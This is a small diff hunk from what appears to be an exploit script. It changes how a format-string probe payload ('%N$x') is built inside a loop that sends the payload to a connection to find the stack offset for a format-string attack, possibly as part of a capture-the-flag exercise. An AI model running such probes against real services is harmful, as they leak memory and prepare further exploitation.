@@ -92,7 +92,7 @@ for offset in range(1, 20) {
     print("[*] Testing offset:", offset)
     
     # Create format string payload
-    let test_payload = "%{offset}$x".format(offset=offset)
+    let test_payload = "%{offset}$x".format({offset: offset})
     
     # Send and check response
     send(fmt_conn, test_payload + "\n")
